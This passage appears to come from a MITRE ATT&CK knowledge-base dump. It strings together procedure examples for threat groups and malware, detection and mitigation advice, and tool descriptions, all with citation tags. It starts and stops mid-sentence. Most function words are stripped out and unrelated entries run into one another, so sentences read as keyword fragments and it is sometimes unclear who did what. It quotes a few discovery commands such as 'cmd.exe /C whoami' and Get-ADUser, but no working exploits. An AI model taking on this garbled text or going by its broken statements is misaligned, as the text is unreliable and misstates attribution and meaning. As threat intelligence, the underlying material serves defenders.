(MBR).(Citation: FireEye APT37 Feb 2018)(Citation: Talos Group123) [APT29](https://attack.mitre.org/groups/G0016) [AdFind](https://attack.mitre.org/software/S0552) enumerate remote systems.(Citation: Deep Dive Solorigate January 2021) [Agent.btz](https://attack.mitre.org/software/S0092) attempts download encrypted binary domain.(Citation: ThreatExpert Agent.btz) (Citation: TrendMicro Tonto Team October 2020) [RCSession](https://attack.mitre.org/software/S0662) bypass UAC escalate privileges.(Citation: Trend Micro DRBControl February 2020) Monitor newly constructed files abuse Office add-ins persistence compromised system. [Kazuar](https://attack.mitre.org/software/S0265) cmd.exe execute commands victim’s machine.(Citation: Unit 42 Kazuar 2017) [Sliver](https://attack.mitre.org/software/S0633) collect network connection information.(Citation: GitHub Sliver Netstat) [Okrum](https://attack.mitre.org/software/S0439) mimics protocol C2 communication, hiding actual messages Cookie Set-Cookie headers requests.(Citation: ESET Okrum July 2019) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  [GreyEnergy](https://attack.mitre.org/software/S0342) module [Mimikatz](https://attack.mitre.org/software/S0002) collect Windows credentials victim’s machine.(Citation: ESET GreyEnergy Oct 2018) [Ursnif](https://attack.mitre.org/software/S0386) droppers properties execute malware hidden windows.(Citation: Bromium Ursnif Mar 2017) (Citation: FireEye APT37 Feb 2018)(Citation: Unit 42 Nokki Oct 2018) Limit access Instance Metadata API host-based firewall iptables. properly configured Application Firewall (WAF) prevent external adversaries exploiting Server-side Request Forgery (SSRF) attacks access Cloud Instance Metadata API.(Citation: RedLock Instance Metadata API 2018) module [Prikormka](https://attack.mitre.org/software/S0113) collects victim current user name.(Citation: ESET Operation Groundbait) [PHOREAL](https://attack.mitre.org/software/S0158) communicates ICMP C2.(Citation: FireEye APT32 2017) [APT41](https://attack.mitre.org/groups/G0096) created services benign tools.(Citation: IB APT 41 June 2021) (Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: DFIR Ryuk's Return October 2020)(Citation: DFIR Ryuk 2 Hour Speed November 2020)(Citation: DFIR Ryuk 5 Hours October 2020)(Citation: Sophos Ryuk Attack October 2020)(Citation: CrowdStrike Wizard Spider October 2020) Monitor newly constructed scheduled jobs enabling "Microsoft-Windows-TaskScheduler/Operational" setting event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) events logged scheduled task activity, including: Event 106 Windows 7, Server 2008 R2 - Scheduled task registered; Event 4698 Windows 10, Server 2016 - Scheduled task created;
Event 4700 Windows 10, Server 2016 - Scheduled task enabled;
Event 4701 Windows 10, Server 2016 - Scheduled task disabled [APT3](https://attack.mitre.org/groups/G0022) downloader Windows command <code>"cmd.exe" /C whoami</code> verify running elevated privileges “System.”(Citation: FireEye Operation Double Tap) [MegaCortex](https://attack.mitre.org/software/S0576) enable <code>SeDebugPrivilege</code> adjust token privileges.(Citation: IBM MegaCortex) [Regin](https://attack.mitre.org/software/S0019) appears functionality sniff credentials passed HTTP, SMTP, SMB.(Citation: Kaspersky Regin) [PoshC2](https://attack.mitre.org/software/S0378) <code>Get-PassPol</code> enumerate domain password policy.(Citation: GitHub PoshC2) (Citation: Reaqta MuddyWater November 2017)(Citation: TrendMicro POWERSTATS V3 June 2019) [Clop](https://attack.mitre.org/software/S0611) msiexec.exe disable security tools system.(Citation: Cybereason Clop Dec 2020)  [TrailBlazer](https://attack.mitre.org/software/S0682) ability WMI persistence.(Citation: CrowdStrike StellarParticle January 2022) Monitor attempt user gain access network computing resource, providing credentials search compromised systems insecurely stored credentials. [Volgmer](https://attack.mitre.org/software/S0180) deobfuscates strings APIs executed.(Citation: US-CERT Volgmer 2 Nov 2017) [CARROTBAT](https://attack.mitre.org/software/S0462) ability download base64 encoded payload execute obfuscated commands infected host.(Citation: Unit 42 CARROTBAT November 2018) CMSTP.exe environment (unless VPN connection installation). Monitor executed commands arguments binaries involved data destruction activity, SDelete. [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013), threat actors ExpressVPN service hide location.(Citation: Bleeping Op Sharpshooter March 2019) (Citation: ESET Dukes October 2019)(Citation: Secureworks IRON HEMLOCK Profile) [ZxShell](https://attack.mitre.org/software/S0412) check services system.(Citation: Talos ZxShell Oct 2014)  Limit privileges user accounts authorized administrators edit environment variables. [DarkHydrus](https://attack.mitre.org/groups/G0079) tools [Mimikatz](https://attack.mitre.org/software/S0002), [Empire](https://attack.mitre.org/software/S0363), [Cobalt Strike](https://attack.mitre.org/software/S0154).(Citation: Unit 42 DarkHydrus July 2018) (Citation: Palo Alto OilRig Oct 2016) [BLACKCOFFEE](https://attack.mitre.org/software/S0069) obfuscated C2 traffic normal traffic sites Github.(Citation: FireEye APT17)(Citation: FireEye Periscope March 2018) Monitor Azure Activity Logs Service Principal Application modifications. [SILENTTRINITY](https://attack.mitre.org/software/S0692) search modifiable services privilege escalation.(Citation: GitHub SILENTTRINITY Modules July 2019) [APT39](https://attack.mitre.org/groups/G0087) utilized malicious VBS scripts malware.(Citation: FBI FLASH APT39 September 2020) [FIN8](https://attack.mitre.org/groups/G0061)'s malicious spearphishing payloads WMI launch malware spawn cmd.exe execution. [FIN8](https://attack.mitre.org/groups/G0061) WMIC lateral movement post compromise cleanup activities.(Citation: FireEye Obfuscation June 2017)(Citation: Bitdefender FIN8 July 2021)(Citation: FireEye Enemy FIN8 Aug 2016) [BoomBox](https://attack.mitre.org/software/S0635) encrypt data AES prior exfiltration.(Citation: MSTIC Nobelium Toolset 2021) (Citation: CheckPoint Naikon 2020)(Citation: Bitdefender Naikon April 2021) [InvisiMole](https://attack.mitre.org/software/S0260) winapiexec tool indirect execution  <code>ShellExecuteW</code> <code>CreateProcessA</code>.(Citation: ESET InvisiMole June 2020) [APT17](https://attack.mitre.org/groups/G0025) created cultivated profile TechNet. profile legitimate, [APT17](https://attack.mitre.org/groups/G0025) created biographical sections posted forum threads.(Citation: FireEye APT17) [Zebrocy](https://attack.mitre.org/software/S0251) capability upload dumper tools extract credentials browsers store database files.(Citation: ESET Zebrocy 2019) [PcShare](https://attack.mitre.org/software/S1050) capture camera video collection process.(Citation: Bitdefender FunnyDream Campaign November 2020) read-only containers, read-only file systems, minimal images prevent execution commands.(Citation: Kubernetes Hardening Guide) (Citation: Secureworks BRONZE BUTLER Oct 2017)(Citation: Symantec Tick Apr 2016) [njRAT](https://attack.mitre.org/software/S0385) collect data local system.(Citation: Fidelis njRAT June 2013) [InvisiMole](https://attack.mitre.org/software/S0260) enumerate Registry values, keys, data.(Citation: ESET InvisiMole June 2018) [LookBack](https://attack.mitre.org/software/S0582) function decrypts malicious data.(Citation: Proofpoint LookBack Malware Aug 2019) [LookBack](https://attack.mitre.org/software/S0582) loads communications module DLL <code>libcurl.dll</code> loader.(Citation: Proofpoint LookBack Malware Aug 2019) [DarkWatchman](https://attack.mitre.org/software/S0673) JavaScript perform core functionalities.(Citation: Prevailion DarkWatchman 2021) [Kobalos](https://attack.mitre.org/software/S0641) chain multiple compromised machines proxies reach final targets.(Citation: ESET Kobalos Feb 2021)(Citation: ESET Kobalos Jan 2021) [TinyZBot](https://attack.mitre.org/software/S0004) supports execution command-line.(Citation: Cylance Cleaver) Policy disable screensavers unnecessary. (Citation: TechNet Screensaver GP) [Cannon](https://attack.mitre.org/software/S0351) adds Registry key <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</code> establish persistence.(Citation: Unit42 Cannon Nov 2018) Monitor newly executed processes [Valid Accounts](https://attack.mitre.org/techniques/T1078) log service designed accept remote connections, RDP, telnet, SSH, VNC. adversary perform actions spawn additional processes logged-on user. [APT29](https://attack.mitre.org/groups/G0016) bypassed UAC.(Citation: Mandiant Easy Breach) [FunnyDream](https://attack.mitre.org/campaigns/C0007), threat actors [Systeminfo](https://attack.mitre.org/software/S0096) collect targeted hosts.(Citation: Bitdefender FunnyDream Campaign November 2020) [Misdat](https://attack.mitre.org/software/S0083) Windows APIs, including `ExitWindowsEx` `GetKeyboardType`.(Citation: Cylance Dust Storm)  technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [MarkiRAT](https://attack.mitre.org/software/S0652) capture screenshots initially saved ‘scr.jpg’.(Citation: Kaspersky Ferocious Kitten Jun 2021) [Empire](https://attack.mitre.org/software/S0363) leverage implementation [Mimikatz](https://attack.mitre.org/software/S0002) silver tickets.(Citation: Github PowerShell Empire) [FunnyDream](https://attack.mitre.org/software/S1044) ability discover application windows execution `EnumWindows`.(Citation: Bitdefender FunnyDream Campaign November 2020) [PLAINTEE](https://attack.mitre.org/software/S0254) downloaded executed additional plugins.(Citation: Rancor Unit42 June 2018) [Tropic Trooper](https://attack.mitre.org/groups/G0081) attempted transfer [USBferry](https://attack.mitre.org/software/S0452) infected USB device copying Autorun function target machine.(Citation: TrendMicro Tropic Trooper 2020) [Silence](https://attack.mitre.org/groups/G0091) leveraged Windows API, including CreateProcess() ShellExecute(), perform variety tasks.(Citation: SecureList Silence Nov 2017)(Citation: IB Silence Sept 2018) (Citation: FireEye APT37 Feb 2018) [Kinsing](https://attack.mitre.org/software/S0599) created Bitcoin cryptocurrency miner.(Citation: Aqua Kinsing April 2020)(Citation: Sysdig Kinsing November 2020) [Machete](https://attack.mitre.org/software/S0409) pyobfuscate, zlib compression, base64 encoding obfuscation. [Machete](https://attack.mitre.org/groups/G0095) visual obfuscation techniques naming variables combinations letters hinder analysis.(Citation: Cylance Machete Mar 2017)(Citation: ESET Machete July 2019) detection malicious tool trigger anti-virus security tool alert. events occur boundary network IDS, email scanning appliance, etc. initial detection treated indication invasive intrusion. alerting investigated initial alert activity detected. Adversaries continue operation, assuming individual events anti-virus detect investigated analyst conclusively link event activity occurring network. [APT32](https://attack.mitre.org/groups/G0050) Dropbox, Amazon S3, Google Drive host malicious downloads.(Citation: Volexity Ocean Lotus November 2020) [Felismus](https://attack.mitre.org/software/S0171) command execution.(Citation: Forcepoint Felismus Mar 2017) [APT28](https://attack.mitre.org/groups/G0007) mapped network drives [Net](https://attack.mitre.org/software/S0039) administrator credentials.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [ChChes](https://attack.mitre.org/software/S0144) samples digitally signed certificate originally Hacking Team leaked subsequently revoked.(Citation: Palo Alto menuPass Feb 2017)(Citation: JPCERT ChChes Feb 2017)(Citation: PWC Cloud Hopper Technical Annex April 2017) [TYPEFRAME](https://attack.mitre.org/software/S0263) search directories files victim’s machine.(Citation: US-CERT TYPEFRAME June 2018) Monitor attempt user gain access network computing resource, domain authentication services, Security Services Daemon (sssd) Linux [USBStealer](https://attack.mitre.org/software/S0136) collects files matching criteria victim stores local directory exfiltration.(Citation: ESET Sednit USBStealer 2014)(Citation: Kaspersky Sofacy) [StoneDrill](https://attack.mitre.org/software/S0380) disk wiper module targets files Windows directory.(Citation: Kaspersky StoneDrill 2017) [PolyglotDuke](https://attack.mitre.org/software/S0518) custom algorithm decrypt strings malware.(Citation: ESET Dukes October 2019) [FIN7](https://attack.mitre.org/groups/G0046) exploited ZeroLogon (CVE-2020-1472) vulnerable domain controllers.(Citation: CrowdStrike Carbon Spider August 2021) [VBShower](https://attack.mitre.org/software/S0442) ability download VBS files target computer.(Citation: Kaspersky Cloud Atlas August 2019) [Regin](https://attack.mitre.org/software/S0019) appears functionality modify remote Registry information.(Citation: Kaspersky Regin) [JSS Loader](https://attack.mitre.org/software/S0648) ability download execute PowerShell scripts.(Citation: CrowdStrike Carbon Spider August 2021) application control appropriate. Enable AES Kerberos encryption (or stronger encryption algorithm), RC4, possible.(Citation: AdSecurity Cracking Kerberos Dec 2015) (Citation: ClearSky Wilted Tulip July 2017) [Leviathan](https://attack.mitre.org/groups/G0065) compromised email accounts conduct social engineering attacks.(Citation: CISA AA21-200A APT40 July 2021) deletion instance virtual machine common operations cloud environments. Events viewed isolation, chain behavior lead activities. example, detecting sequence events creation instance, mounting snapshot instance, deletion instance user account suspicious activity.

In AWS, CloudTrail logs capture deletion instance the TerminateInstances event, Azure deletion VM captured Azure activity logs.(Citation: AWS CloudTrail Search) (Citation: Azure Activity Logs) Google's Admin Activity audit logs Cloud Audit logs detect usage of gcloud compute instances delete to delete VM.(Citation: Cloud Audit Logs) [GravityRAT](https://attack.mitre.org/software/S0237) collects WMI requests, including CPU Win32_Processor entry (Processor ID, Name, Manufacturer clock speed).(Citation: Talos GravityRAT) [RTM](https://attack.mitre.org/software/S0148) delete files created execution.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019) [Javali](https://attack.mitre.org/software/S0528) download payloads remote C2 servers.(Citation: Securelist Brazilian Banking Malware July 2020) Monitor newly constructed network connections received untrusted hosts.  [Calisto](https://attack.mitre.org/software/S0274) adds permissions remote logins users.(Citation: Symantec Calisto July 2018) [Cobalt Strike](https://attack.mitre.org/software/S0154) hash functions obfuscate calls Windows API public/private key pair encrypt Beacon session metadata.(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) anti-spoofing email authentication mechanisms filter messages based validity checks sender domain (using SPF) integrity messages (using DKIM). Enabling mechanisms organization (through policies DMARC) enable recipients (intra-org cross domain) perform message filtering validation.(Citation: Anti Spoofing)(Citation: ACSC Email Spoofing) [Lokibot](https://attack.mitre.org/software/S0447) demonstrated ability steal credentials multiple applications data sources including Safari Chromium Mozilla Firefox-based browsers.(Citation: Infoblox Lokibot January 2019) Monitor existence unrecognized DLLs, drivers, devices, services, MBR. (Citation: Wikipedia Rootkit) [jRAT](https://attack.mitre.org/software/S0283) steal VPNs cryptocurrency wallets.(Citation: Kaspersky Adwind Feb 2016) [Wingbird](https://attack.mitre.org/software/S0176) checks victim OS version executing determine drop files based victim 32-bit 64-bit.(Citation: SIR 21) [WannaCry](https://attack.mitre.org/software/S0366) attempts remote computers gaining access SMB exploit.(Citation: LogRhythm WannaCry) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors `tasklist` collect list running processes infected system.(Citation: FoxIT Wocao December 2019) [FIN7](https://attack.mitre.org/groups/G0046) developed malware operations, including creation infected removable media.(Citation: FBI Flash FIN7 USB)(Citation: FireEye FIN7 Oct 2019) Monitor executed commands arguments InstallUtil.exe invocation determining origin purpose binary executed. [Squirrelwaffle](https://attack.mitre.org/software/S1030) collected victim’s external IP address.(Citation: ZScaler Squirrelwaffle Sep 2021) 
Consider disabling restricting NTLM.(Citation: Disable NTLM Nov 2012) disabling WDigest authentication.(Citation: WDigest Mit) [RogueRobin](https://attack.mitre.org/software/S0270) created shortcut Windows startup folder launch PowerShell script time user logs establish persistence.(Citation: Unit 42 DarkHydrus July 2018) Monitor status firewall Windows Security Auditing events 5025 (The Windows firewall service stopped) 5034 (The Windows firewall driver stopped). [Threat Group-3390](https://attack.mitre.org/groups/G0027) `net use` `netstat` conduct internal discovery systems. `quser.exe` identify existing RDP sessions victim.(Citation: SecureWorks BRONZE UNION June 2017) [APT39](https://attack.mitre.org/groups/G0087) secure (SSH) laterally targets.(Citation: FireEye APT39 Jan 2019) [Bundlore](https://attack.mitre.org/software/S0482) change browser security settings enable extensions installed. [Bundlore](https://attack.mitre.org/software/S0482) <code>pkill cfprefsd</code> command prevent users inspecting processes.(Citation: MacKeeper Bundlore Apr 2019)(Citation: 20 macOS Common Tools Techniques) anti-spoofing email authentication mechanisms filter messages based validity checks sender domain (using SPF) integrity messages (using DKIM). Enabling mechanisms organization (through policies DMARC) enable recipients (intra-org cross domain) perform message filtering validation.(Citation: Anti Spoofing)(Citation: ACSC Email Spoofing)

Furthermore, policies enforce / install browser extensions protect IDN homograph attacks. Browser password managers configured populate credential fields URL matches original, legitimate site.  [Calisto](https://attack.mitre.org/software/S0274) capability add account victim's machine.(Citation: Symantec Calisto July 2018) Based comparison [Gazer](https://attack.mitre.org/software/S0168) versions, [Turla](https://attack.mitre.org/groups/G0010) effort obfuscate strings malware IoCs, including mutex named pipe.(Citation: ESET Gazer Aug 2017) [Sys10](https://attack.mitre.org/software/S0060) collects account logged-in user sends C2.(Citation: Baumgartner Naikon 2015) Scan public code repositories exposed credentials sensitive commits. Ensure leaked credentials removed commit history, current version code. [Industroyer](https://attack.mitre.org/software/S0604) heavily obfuscated code Windows Notepad backdoor.(Citation: ESET Industroyer) embedded network devices provide command print version running operating system. command query operating version compare expected device question. method conjunction with  [Patch Image](https://attack.mitre.org/techniques/T1601/001), verify integrity vendor operating image file.

Compare checksum operating file checksum trusted source. embedded network device platforms capability calculate checksum file, not. platforms capability, recommended download file trusted calculate checksum software compromised. (Citation: Cisco IOS Software Integrity Assurance - Image File Verification)

Many vendors embedded network devices provide advanced debugging support device owners validate integrity operating running memory. compromise operating suspected, contact vendor technical support seek services inspection current running system.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification) [UNC2452](https://attack.mitre.org/groups/G0118) Ticket Granting Service (TGS) tickets Active Directory Service Principle Names crack offline.(Citation: Deep Dive Solorigate January 2021) [Action RAT](https://attack.mitre.org/software/S1028) `cmd.exe` execute commands infected host.(Citation: MalwareBytes SideCopy Dec 2021) released optional patch update - KB3045645 - remove "auto-elevate" flag sdbinst.exe. prevent application shimming bypass UAC.  [APT3](https://attack.mitre.org/groups/G0022) remove indicators compromise tools.(Citation: APT3 Adversary Emulation Plan) [IndigoZebra](https://attack.mitre.org/groups/G0136) downloaded additional files tools C2 server.(Citation: Checkpoint IndigoZebra July 2021) (Citation: Bitdefender FIN8 July 2021) Monitor executed commands arguments forge credential materials gain access applications Internet services. services aid tracking certificates sites Internet. pivot pieces certificate uncover adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)
Detection efforts focused behaviors, [Web Protocols](https://attack.mitre.org/techniques/T1071/001) , [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) , [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004) . [Keydnap](https://attack.mitre.org/software/S0276) Launch Agent persist.(Citation: synack 2016 review) [Sandworm Team](https://attack.mitre.org/groups/G0034) avoided detection naming malicious binary explorer.exe.(Citation: ESET Telebots Dec 2016)(Citation: District Court Indictment GRU Unit 74455 October 2020) [SUNBURST](https://attack.mitre.org/software/S0559) removed proxy registry values clean traces execution.(Citation: Deep Dive Solorigate January 2021) [iKitten](https://attack.mitre.org/software/S0278) adds entry rc.common file persistence.(Citation: objsee mac malware 2017) [HAFNIUM](https://attack.mitre.org/groups/G0125) operated leased virtual private servers (VPS) United States.(Citation: HAFNIUM March 2020) [SUGARUSH](https://attack.mitre.org/software/S1049) TCP C2.(Citation: Mandiant UNC3890 Aug 2022) [Neoichor](https://attack.mitre.org/software/S0691) browser history compromised host changing `ClearBrowsingHistoryOnExit` 1 `HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Privacy` Registry key.(Citation: NICKEL December 2021)

 [TA505](https://attack.mitre.org/groups/G0092) executed commands <code>cmd.exe</code>.(Citation: Trend Micro TA505 June 2019) [ZeroT](https://attack.mitre.org/software/S0230) encrypted payload RC4.(Citation: Proofpoint ZeroT Feb 2017) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Refer NIST guidelines creating password policies.  (Citation: NIST 800-63-3) Monitor unexpected deletion active directory object, Windows EID 5141. Monitor windows registry deleted alter generated artifacts host system, including logs captured files quarantined malware. [Pysa](https://attack.mitre.org/software/S0583) perform network reconnaissance Advanced Port Scanner tool.(Citation: CERT-FR PYSA April 2020) [WindTail](https://attack.mitre.org/software/S0466) ability generate current time.(Citation: objective-see windtail1 dec 2018) [Amadey](https://attack.mitre.org/software/S1025) identify IP address victim machine.(Citation: BlackBerry Amadey 2020) [Raindrop](https://attack.mitre.org/software/S0565) decrypted [Cobalt Strike](https://attack.mitre.org/software/S0154) payload AES-256 encryption algorithm CBC mode unique key sample.(Citation: Symantec RAINDROP January 2021)(Citation: Deep Dive Solorigate January 2021) [Rocke](https://attack.mitre.org/groups/G0106) changed time stamp files.(Citation: Anomali Rocke March 2019)	 [Magic Hound](https://attack.mitre.org/groups/G0059) conducted watering-hole attacks media magazine websites.(Citation: ClearSky Kittens 3 August 2020) [QakBot](https://attack.mitre.org/software/S0650) delete folders files including overwriting executable legitimate programs.(Citation: Kroll Qakbot June 2020)(Citation: Crowdstrike Qakbot October 2020)(Citation: ATT QakBot April 2021)(Citation: IB Ransomware September 2020) [QUADAGENT](https://attack.mitre.org/software/S0269) creates scheduled task maintain persistence victim’s machine.(Citation: Unit 42 QUADAGENT July 2018) [DarkWatchman](https://attack.mitre.org/software/S0673) list signed PnP drivers smartcard readers.(Citation: Prevailion DarkWatchman 2021) Periodically review user accounts remove inactive unnecessary. Limit ability user accounts create additional accounts. [SombRAT](https://attack.mitre.org/software/S0615) execute <code>getinfo</code> enumerate OS version compromised system.(Citation: BlackBerry CostaRicto November 2020) [POWERSTATS](https://attack.mitre.org/software/S0223) <code>get_tasklist</code> discover processes compromised host.(Citation: TrendMicro POWERSTATS V3 June 2019) [Comnie](https://attack.mitre.org/software/S0244) RC4 Base64 obfuscate strings.(Citation: Palo Alto Comnie) [Rocke](https://attack.mitre.org/groups/G0106) scripts download mining executables saves filename "java".(Citation: Talos Rocke August 2018) [Bandook](https://attack.mitre.org/software/S0234) signed valid Certum certificates.(Citation: CheckPoint Bandook Nov 2020)  [Pandora](https://attack.mitre.org/software/S0664) write encrypted token Registry enable processing remote commands.(Citation: Trend Micro Iron Tiger April 2021) [Sidewinder](https://attack.mitre.org/groups/G0121) DLL side-loading drop execute malicious payloads including hijacking legitimate Windows application file rekeywiz.exe.(Citation: ATT Sidewinder January 2021) Monitor newly executed processes abuse Windows command execution. [APT29](https://attack.mitre.org/groups/G0016) UPX pack files.(Citation: Mandiant Easy Breach) [TeamTNT](https://attack.mitre.org/groups/G0139) leveraged iplogger.org send collected data C2.(Citation: Aqua TeamTNT August 2020)(Citation: Cisco Talos Intelligence Group) [POWERTON](https://attack.mitre.org/software/S0371) WMI persistence.(Citation: FireEye APT33 Guardrail) [Taidoor](https://attack.mitre.org/software/S0011) TCP C2 communications.(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) (Citation: Trend Micro Tick November 2019) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. custom protocol adhere typical protocol standards, opportunities signature traffic network level detection. Signatures unique indicators protocols based specific protocol adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) [CosmicDuke](https://attack.mitre.org/software/S0050) steals user files removable media file extensions keywords match predefined list.(Citation: F-Secure Cosmicduke) [Imminent Monitor](https://attack.mitre.org/software/S0434) feature disable Windows Task Manager.(Citation: Imminent Unit42 Dec2019)	 [Earth Lusca](https://attack.mitre.org/groups/G1006) compromised servers operational infrastructure.(Citation: TrendMicro EarthLusca 2022) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) Right-to-Left Override deceive victims executing strains malware.(Citation: Trend Micro Tick November 2019) [Saint Bot](https://attack.mitre.org/software/S1018) collect files compromised host.(Citation: Malwarebytes Saint Bot April 2021) Monitor analyze activity items CPL files, control.exe. Analyze Control Panel items disk malicious content. executable CPL formats compliant Portable Executable (PE) images examined traditional tools methods, pending anti-reverse-engineering techniques.(Citation: TrendMicro CPL Malware Jan 2014) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors modified MaoCheng dropper icon appeared Word document.(Citation: McAfee Honeybee) Protect domain controllers ensuring proper security configuration critical servers limit access unnecessary protocols services, SMB file sharing. [Dtrack](https://attack.mitre.org/software/S0567) decryption routine executable physical patch.(Citation: Securelist Dtrack) creation instance VM common operations cloud environments. Events viewed isolation, chain behavior lead activities. example, creation instance user account unexpected creation snapshots creation instance suspicious activity.
In AWS, CloudTrail logs capture creation instance the RunInstances event, Azure creation VM captured Azure activity logs.(Citation: AWS CloudTrail Search) (Citation: Azure Activity Logs) Google's Admin Activity audit logs Cloud Audit logs detect usage of gcloud compute instances create to create VM.(Citation: Cloud Audit Logs) [Aria-body](https://attack.mitre.org/software/S0456) ability gather TCP UDP table status listings.(Citation: CheckPoint Naikon 2020) document matching extensions configuration, [TINYTYPHON](https://attack.mitre.org/software/S0131) uploads C2 server.(Citation: Forcepoint Monsoon) [Cardinal RAT](https://attack.mitre.org/software/S0348) encodes artifacts encrypted (AES-128) downloaded.(Citation: PaloAlto CardinalRat Apr 2017)  [BlackTech](https://attack.mitre.org/groups/G0098) valid, stolen digital certificates malware tools.(Citation: ESET PLEAD Malware July 2018) [TRITON](https://attack.mitre.org/software/S0609) encoded inject.bin imain.bin payloads.(Citation: FireEye TRITON 2017) [LazyScripter](https://attack.mitre.org/groups/G0140) established GitHub accounts host toolsets.(Citation: MalwareBytes LazyScripter Feb 2021) [Fysbis](https://attack.mitre.org/software/S0410) ability create execute commands remote CLI.(Citation: Fysbis Palo Alto Analysis) [Lizar](https://attack.mitre.org/software/S0681) encrypted data sending server.(Citation: BiZone Lizar 2021) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors `mshta` execute DLLs.(Citation: DFIR Conti Bazar Nov 2021) enabling file/directory permission change auditing folders key binary/configuration files. example, Windows Security Log events (Event 4670) created DACLs modified. Anti-virus automatically detect quarantine suspicious files. utilizing Antimalware Scan Interface (AMSI) Windows analyze commands processed/interpreted. (Citation: AMSI June 2015) Monitor analyze traffic patterns packet inspection protocol(s), leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [APT41](https://attack.mitre.org/groups/G0096) search hijacking execute malicious payloads, Winnti RAT.(Citation: Crowdstrike GTR2020 Mar 2020) [Rocke](https://attack.mitre.org/groups/G0106) scripts detected uninstalled antivirus software.(Citation: Talos Rocke August 2018)(Citation: Unit 42 Rocke January 2019) Monitor executed commands arguments execute malicious payloads hijacking operating systems programs. [APT29](https://attack.mitre.org/groups/G0016) PowerShell discover domain accounts executing <code>Get-ADUser</code> <code>Get-DGroupMember</code>.(Citation: CrowdStrike StellarParticle January 2022)(Citation: Secureworks IRON RITUAL Profile) Monitor settings modify access tokens operate user security context perform actions bypass access controls. Monitor alike file hashes characteristics (ex: filename) created multiple hosts. Periodically baseline instances identify malicious modifications additions. [Lizar](https://attack.mitre.org/software/S0681) plugin retrieve active network sessions infected server.(Citation: BiZone Lizar 2021) endpoint security solutions configured block types process injection based common sequences behavior occur injection process. [PingPull](https://attack.mitre.org/software/S1031) AES, cipher block chaining (CBC) mode padded PKCS5, encrypt C2 server communications.(Citation: Unit 42 PingPull Jun 2022) [Hancitor](https://attack.mitre.org/software/S0499) decoded Base64 encoded URLs insert recipient’s filename Word document. [Hancitor](https://attack.mitre.org/software/S0499) extracted executables ZIP files.(Citation: Threatpost Hancitor)(Citation: FireEye Hancitor) [menuPass](https://attack.mitre.org/groups/G0045) DLL search hijacking.(Citation: PWC Cloud Hopper April 2017) [Earth Lusca](https://attack.mitre.org/groups/G1006)  spearphishing emails required user malicious link subsequently decoy document malicious loader.(Citation: TrendMicro EarthLusca 2022)  [Bisonal](https://attack.mitre.org/software/S0268) dropped decoy payload .jpg extension contained malicious Visual Basic script.(Citation: Talos Bisonal Mar 2020)  [ZxShell](https://attack.mitre.org/software/S0412) command transfer files remote host.(Citation: Talos ZxShell Oct 2014)  [Net](https://attack.mitre.org/software/S0039) utility component Windows operating system. command-line operations control users, groups, services, network connections. (Citation: Utility)

[Net](https://attack.mitre.org/software/S0039) deal functionality, (Citation: Savill 1999) adversary, gathering network Discovery, moving laterally [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) <code>net use</code> commands, interacting services. net1.exe utility executed functionality net.exe commands <code>net1 user</code>. [RemoteUtilities](https://attack.mitre.org/software/S0592) legitimate remote administration tool [MuddyWater](https://attack.mitre.org/groups/G0069) 2021 execution target machines.(Citation: Trend Micro Muddy Water March 2021) [BloodHound](https://attack.mitre.org/software/S0521) Active Directory (AD) reconnaissance tool reveal hidden relationships identify attack paths environment.(Citation: GitHub Bloodhound)(Citation: CrowdStrike BloodHound April 2018)(Citation: FoxIT Wocao December 2019) [certutil](https://attack.mitre.org/software/S0160) command-line utility certificate authority configure Certificate Services. (Citation: TechNet Certutil) [at](https://attack.mitre.org/software/S0110) schedule tasks time.(Citation: TechNet At)(Citation: Linux at) [UACMe](https://attack.mitre.org/software/S0116) source assessment tool methods bypassing Windows User Account Control multiple versions operating system. (Citation: Github UACMe) [ShimRatReporter](https://attack.mitre.org/software/S0445) tool suspected Chinese adversary [Mofang](https://attack.mitre.org/groups/G0103) automatically conduct initial discovery. details discovery customize follow-on payloads (such [ShimRat](https://attack.mitre.org/software/S0444)) set faux infrastructure mimics adversary's targets. [ShimRatReporter](https://attack.mitre.org/software/S0445) campaigns targeting multiple countries sectors including government, military, critical infrastructure, automobile, weapons development.(Citation: FOX-IT 2016 Mofang) [Sliver](https://attack.mitre.org/software/S0633) source, cross-platform, red team command control framework written Golang.(Citation: Bishop Fox Sliver Framework August 2019) [SILENTTRINITY](https://attack.mitre.org/software/S0692) source remote administration post-exploitation framework written Python includes stagers written Powershell, C, Boo. [SILENTTRINITY](https://attack.mitre.org/software/S0692) 2019 campaign Croatian government agencies unidentified cyber actors.(Citation: GitHub SILENTTRINITY March 2022)(Citation: Security Affairs SILENTTRINITY July 2019) [PowerSploit](https://attack.mitre.org/software/S0194) source, offensive security framework comprised [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules scripts perform wide range tasks penetration testing code execution, persistence, bypassing 